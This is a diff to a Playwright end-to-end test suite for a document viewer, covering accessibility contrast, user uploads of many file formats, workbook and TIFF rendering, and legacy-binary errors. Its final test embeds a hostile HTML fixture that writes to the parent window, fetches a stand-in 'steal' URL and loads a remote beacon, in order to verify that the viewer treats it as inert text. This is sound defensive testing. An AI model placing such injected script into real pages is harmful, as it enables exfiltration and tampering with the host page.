@@ -1,4 +1,7 @@
 import { expect, test, type Page } from "@playwright/test";
+import { buildXlsx } from "../fixtures/xlsx";
+import { buildTiff } from "../fixtures/tiff";
+import { TINY_JPEG, buildBmp } from "../fixtures/images";
 
 /**
  * End-to-end checks against the demo application in real Chrome.
@@ -284,6 +287,76 @@ test.describe("viewer chrome", () => {
     await expect(page.getByRole("toolbar")).toBeVisible();
   });
 
+  test("keeps the presentation exit control readable while hovered", async ({ page }) => {
+    await loadSampleDeck(page);
+    await clickToolbar(page, "Present from this slide");
+    const exit = page.getByRole("button", { name: "Exit presentation" });
+    await page.mouse.move(2, 2);
+    await expect(exit).toBeVisible();
+
+    /**
+     * WCAG contrast between the control's label and the colour it actually sits
+     * on: the button's translucent background composited over the pill, and the
+     * pill over the black slideshow backdrop. A translucent white on dark passes;
+     * the theme's light hover colour under the same near-white label does not.
+     */
+    const contrastFor = async (): Promise<number> =>
+      exit.evaluate((element) => {
+        const parse = (value: string) => {
+          const [r = 0, g = 0, b = 0, a = 1] = (/rgba?\(([^)]+)\)/.exec(value)?.[1] ?? "0,0,0")
+            .split(",")
+            .map(Number);
+          return { r, g, b, a };
+        };
+        const composite = (top: ReturnType<typeof parse>, base: ReturnType<typeof parse>) => ({
+          r: top.r * top.a + base.r * (1 - top.a),
+          g: top.g * top.a + base.g * (1 - top.a),
+          b: top.b * top.a + base.b * (1 - top.a),
+          // The result of compositing over an opaque colour is opaque.
+          a: 1,
+        });
+        const relative = (colour: { r: number; g: number; b: number }) => {
+          const channel = (value: number) => {
+            const scaled = value / 255;
+            return scaled <= 0.03928 ? scaled / 12.92 : ((scaled + 0.055) / 1.055) ** 2.4;
+          };
+          return 0.2126 * channel(colour.r) + 0.7152 * channel(colour.g) + 0.0722 * channel(colour.b);
+        };
+
+        const style = getComputedStyle(element);
+        const pill = getComputedStyle(element.parentElement as Element).backgroundColor;
+        const black = { r: 0, g: 0, b: 0, a: 1 };
+        const background = composite(parse(style.backgroundColor), composite(parse(pill), black));
+        const text = parse(style.color);
+        const lighter = Math.max(relative(background), relative(text));
+        const darker = Math.min(relative(background), relative(text));
+        return (lighter + 0.05) / (darker + 0.05);
+      });
+
+    // Both states must clear WCAG AA for small text (4.5:1). Hover is allowed to
+    // be *less* contrasty than rest — lightening the pill is the hover affordance
+    // — so the bar is an absolute one, not a comparison between the two.
+    const resting = await contrastFor();
+    expect(resting).toBeGreaterThan(4.5);
+
+    // The button fades its background over 120ms, so the settled value is the one
+    // that matters: waiting for it also makes the measurement deterministic rather
+    // than a race with the transition. This is the assertion that pins the fix —
+    // the pill's own translucent white, not the theme's hover colour, which is what
+    // used to win the cascade: reverting the fix makes this read the opaque light
+    // `rgb(236, 238, 241)` (`--radv-btn-hover`) under a near-white label.
+    await exit.hover();
+    await expect
+      .poll(() => exit.evaluate((element) => getComputedStyle(element).backgroundColor))
+      .toBe("rgba(255, 255, 255, 0.24)");
+
+    const hovered = await contrastFor();
+    expect(hovered).toBeGreaterThan(4.5);
+    // Sanity: the two states really are different, so the assertions above are not
+    // both measuring the same rendering.
+    expect(hovered).not.toBeCloseTo(resting, 3);
+  });
+
   test("the demo drives presentation mode through its own control", async ({ page }) => {
     await page.goto("/");
     await page.getByRole("button", { name: "Load sample deck" }).first().click();
@@ -376,19 +449,68 @@ test.describe("viewer chrome", () => {
     expect(Math.abs(wide.width / wide.height - 16 / 9)).toBeLessThan(0.02);
   });
 
+  /** The demo's "Format" row: the second value in its stats list. */
+  const formatCell = (page: Page) => page.locator(".demo__stats dd").nth(1);
+
   test("loads a user-provided file and reports a broken one", async ({ page }) => {
     await page.goto("/");
     const input = page.locator('input[type="file"]');
 
-    // Not a ZIP at all: the viewer must explain itself instead of going blank.
+    // Binary bytes that are neither a package nor text: the viewer must explain
+    // itself instead of going blank.
     await input.setInputFiles({
       name: "broken.pptx",
       mimeType: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-      buffer: Buffer.from("this is not a presentation"),
+      buffer: Buffer.from([0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08]),
     });
     await expect(page.locator(".radv-root")).toHaveAttribute("data-status", "error");
     await expect(page.locator(".radv-status-error")).toBeVisible();
     await expect(page.locator(".demo__stats dd").last()).toContainText("NOT_A_PRESENTATION");
+
+    // The extension is never trusted: a text file named `.pptx` opens as the text
+    // document it actually is, rather than being refused for its name.
+    await input.setInputFiles({
+      name: "notes.pptx",
+      mimeType: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+      buffer: Buffer.from("this is not a presentation, it is a note"),
+    });
+    await expect(page.locator(".radv-root")).toHaveAttribute("data-status", "ready");
+    // Scoped to the stage: the thumbnail sidebar draws the same page component.
+    await expect(page.locator(".radv-canvas .radv-text-page")).toContainText("it is a note");
+    await expect(formatCell(page)).toHaveText("text file");
+  });
+
+  test("opens a table, a text file and an image uploaded by the user", async ({ page }) => {
+    await page.goto("/");
+    const input = page.locator('input[type="file"]');
+
+    await input.setInputFiles({
+      name: "people.csv",
+      mimeType: "text/csv",
+      buffer: Buffer.from("id,name\n1,Ada\n2,Grace\n"),
+    });
+    await expect(page.locator(".radv-root")).toHaveAttribute("data-status", "ready");
+    await expect(page.locator(".radv-canvas .radv-grid-page th").first()).toHaveText("id");
+    await expect(page.locator(".radv-canvas .radv-grid-page")).toContainText("Grace");
+    await expect(formatCell(page)).toHaveText("delimited text table");
+
+    await input.setInputFiles({
+      name: "app.log",
+      mimeType: "text/plain",
+      buffer: Buffer.from("2026-01-01 boot\n2026-01-01 ready\n"),
+    });
+    await expect(page.locator(".radv-canvas .radv-text-page")).toContainText("2026-01-01 ready");
+
+    // A 1x1 PNG, uploaded as an image: one page, sized from the file itself.
+    const png = Buffer.from(
+      "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
+      "base64",
+    );
+    await input.setInputFiles({ name: "pixel.png", mimeType: "image/png", buffer: png });
+    await expect(page.locator(".radv-canvas [data-testid='rv-image-page']")).toBeVisible();
+    await expect(formatCell(page)).toHaveText("image");
+    // The page box is the image's own size, so 1x1 is a 1px-wide page.
+    await expect(page.locator(".demo__stats dd").nth(3)).toHaveText("0.01in × 0.01in");
   });
 
   test("produces no console errors while browsing every slide", async ({ page }) => {
@@ -541,5 +663,193 @@ test.describe("PDF documents", () => {
     });
     await expect(page.locator(".radv-root")).toHaveAttribute("data-status", "error");
     await expect(page.locator(".demo__stats dd").last()).toContainText("MALFORMED_DOCUMENT");
+  });
+});
+
+test.describe("Workbooks and TIFF images", () => {
+  test("opens a workbook as a read-only grid with real values and sheets", async ({ page }) => {
+    const errors: string[] = [];
+    page.on("console", (message) => {
+      if (message.type() === "error") errors.push(message.text());
+    });
+    page.on("pageerror", (error) => errors.push(error.message));
+
+    await loadSample(page, "Load sample .xlsx");
+    await expect(page.locator('.demo__stats dt:has-text("Format") + dd')).toHaveText("Excel workbook");
+    await expect(page.locator('.demo__stats dt:has-text("Slides / pages") + dd')).toHaveText("2");
+    await expect(counter(page)).toHaveText("1 / 2");
+
+    const grid = page.locator(".radv-canvas [data-testid='rv-sheet-page']");
+    await expect(grid).toBeVisible();
+    await expect(grid).toContainText("Region");
+    await expect(grid).toContainText("North");
+    await expect(grid).toContainText("12.80%");
+    await expect(grid).toContainText("2024-01-01");
+    // The merged footer row really spans the sheet, and the formula shows its cache.
+    await expect(grid.locator("td[colspan='4']")).toContainText("never recalculated");
+    await expect(grid).toContainText("381420");
+
+    await page.getByRole("tab", { name: "Slide 2" }).click();
+    await expect(counter(page)).toHaveText("2 / 2");
+    await expect(page.locator(".radv-canvas [data-testid='rv-sheet-page']")).toContainText("Read-only grid");
+
+    expect(errors).toEqual([]);
+  });
+
+  test("decodes every page of a TIFF onto a canvas", async ({ page }) => {
+    const errors: string[] = [];
+    page.on("console", (message) => {
+      if (message.type() === "error") errors.push(message.text());
+    });
+    page.on("pageerror", (error) => errors.push(error.message));
+
+    await loadSample(page, "Load sample .tiff");
+    await expect(page.locator('.demo__stats dt:has-text("Format") + dd')).toHaveText("image");
+    await expect(page.locator('.demo__stats dt:has-text("Slides / pages") + dd')).toHaveText("2");
+    await expect(counter(page)).toHaveText("1 / 2");
+
+    const canvas = page.locator('.radv-canvas [data-testid="rv-tiff-page"]');
+    await expect(canvas).toBeVisible();
+    // Real pixels: the fixture is a solid colour, so the canvas must contain it.
+    await expect
+      .poll(async () =>
+        canvas.evaluate((element) => {
+          const context = (element as HTMLCanvasElement).getContext("2d");
+          return context ? context.getImageData(10, 10, 1, 1).data[0] : 0;
+        }),
+      )
+      .toBeGreaterThan(180);
+    const pixel = await canvas.evaluate((element) => {
+      const context = (element as HTMLCanvasElement).getContext("2d");
+      if (!context) return null;
+      return [...context.getImageData(10, 10, 1, 1).data];
+    });
+    expect(pixel).not.toBeNull();
+    expect(pixel?.[1]).toBeLessThan(120);
+
+    await page.getByRole("tab", { name: "Slide 2" }).click();
+    await expect(counter(page)).toHaveText("2 / 2");
+    // Decoding is asynchronous, so the counter can change a frame before the new
+    // directory has been painted. Poll until the canvas really holds the second
+    // page's colour instead of reading the previous page's pixels.
+    await expect
+      .poll(async () =>
+        canvas.evaluate((element) => {
+          const context = (element as HTMLCanvasElement).getContext("2d");
+          return context ? context.getImageData(10, 10, 1, 1).data[2] : 0;
+        }),
+      )
+      .toBeGreaterThan(80);
+    const second = await canvas.evaluate((element) => {
+      const context = (element as HTMLCanvasElement).getContext("2d");
+      if (!context) return null;
+      return [...context.getImageData(10, 10, 1, 1).data];
+    });
+    // The second directory is blue, so the page really changed.
+    expect(second?.[0]).toBeLessThan(100);
+
+    expect(errors).toEqual([]);
+  });
+});
+
+test.describe("Every advertised format", () => {
+  test("opens each image extension and each text extension", async ({ page }) => {
+    await page.goto("/");
+    const input = page.locator('input[type="file"]');
+
+    for (const [name, mimeType, buffer] of [
+      ["pixel.bmp", "image/bmp", buildBmp()],
+      ["photo.jpg", "image/jpeg", TINY_JPEG],
+      ["photo.jpeg", "image/jpeg", TINY_JPEG],
+    ] as const) {
+      await input.setInputFiles({ name, mimeType, buffer: Buffer.from(buffer) });
+      await expect(page.locator(".radv-canvas [data-testid='rv-image-page']")).toBeVisible();
+      await expect(page.locator('.demo__stats dt:has-text("Format") + dd')).toHaveText("image");
+    }
+
+    for (const [name, mimeType] of [
+      ["note.txt", "text/plain"],
+      ["page.htm", "text/htm"],
+      ["page.html", "text/html"],
+    ] as const) {
+      await input.setInputFiles({ name, mimeType, buffer: Buffer.from(`Contents of ${name}`) });
+      await expect(page.locator(".radv-canvas [data-testid='rv-text-page']")).toContainText(`Contents of ${name}`);
+      await expect(page.locator('.demo__stats dt:has-text("Format") + dd')).toHaveText("text file");
+    }
+  });
+
+  test("names each legacy binary instead of guessing", async ({ page }) => {
+    await page.goto("/");
+    const input = page.locator('input[type="file"]');
+
+    /** The same minimal compound file the OLE unit tests use: a header and a stream name. */
+    const compoundFile = (stream: string): Buffer => {
+      const bytes = [0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1];
+      for (let index = 0; index < 24; index += 1) bytes.push(0);
+      for (const character of stream) bytes.push(character.charCodeAt(0) & 0xff, 0);
+      for (let index = 0; index < 8; index += 1) bytes.push(0);
+      return Buffer.from(bytes);
+    };
+
+    for (const [name, mimeType, stream, extension] of [
+      ["old.doc", "application/msword", "WordDocument", ".doc"],
+      ["old.ppt", "application/vnd.ms-powerpoint", "PowerPoint Document", ".ppt"],
+      ["old.xls", "application/vnd.ms-excel", "Workbook", ".xls"],
+    ] as const) {
+      await input.setInputFiles({ name, mimeType, buffer: compoundFile(stream) });
+      await expect(page.locator(".radv-root")).toHaveAttribute("data-status", "error");
+      await expect(page.locator(".radv-status-error")).toContainText("UNSUPPORTED_FORMAT");
+      await expect(page.locator(".radv-status-error")).toContainText(extension);
+    }
+  });
+});
+
+test.describe("HTML files", () => {
+  /**
+   * The one claim about an HTML file that only a real browser can settle: what it
+   * cannot do. The file here is hostile — it scripts the page that embeds it, calls
+   * `fetch` and loads a remote image — and it is shown the way any other text file
+   * is, so none of that can happen: there is no frame for it to run in, and no
+   * request is made on its behalf. The assertions are made against the host page
+   * and the network, not against the viewer's own attributes.
+   */
+  test("shows a hostile HTML file as text, executing and loading nothing", async ({ page }) => {
+    const pageErrors: string[] = [];
+    const responses: string[] = [];
+    page.on("pageerror", (error) => pageErrors.push(error.message));
+    page.on("response", (response) => responses.push(response.url()));
+
+    await page.goto("/");
+    await page.locator('input[type="file"]').setInputFiles({
+      name: "hostile.html",
+      mimeType: "text/html",
+      buffer: Buffer.from(
+        [
+          "<!doctype html>",
+          '<html><head><title>Raw title</title></head><body><h1 id="headline">Raw</h1>',
+          '<img src="https://example.invalid/beacon.gif" alt="remote beacon">',
+          "<script>",
+          '  window.parent.__htmlPwned = "parent global";',
+          '  document.getElementById("headline").textContent = "script ran";',
+          '  fetch("https://example.invalid/steal");',
+          "</script></body></html>",
+        ].join("\n"),
+      ),
+    });
+
+    await expect(page.locator(".radv-root")).toHaveAttribute("data-status", "ready");
+    await expect(page.locator('.demo__stats dt:has-text("Format") + dd')).toHaveText("text file");
+
+    // Read as source text, on a paper page — and in no frame at all.
+    const source = page.locator(".radv-canvas [data-testid='rv-text-page']");
+    await expect(source).toContainText("window.parent.__htmlPwned");
+    await expect(source).toContainText("example.invalid/beacon.gif");
+    await expect(page.locator(".radv-canvas iframe")).toHaveCount(0);
+
+    // Nothing was assigned onto the host page, nothing threw, and the beacon got no
+    // response: a file that was never given an origin cannot reach either.
+    expect(await page.evaluate(() => (window as unknown as Record<string, unknown>).__htmlPwned)).toBeUndefined();
+    expect(pageErrors).toEqual([]);
+    expect(responses.filter((url) => url.includes("example.invalid"))).toEqual([]);
   });
 });
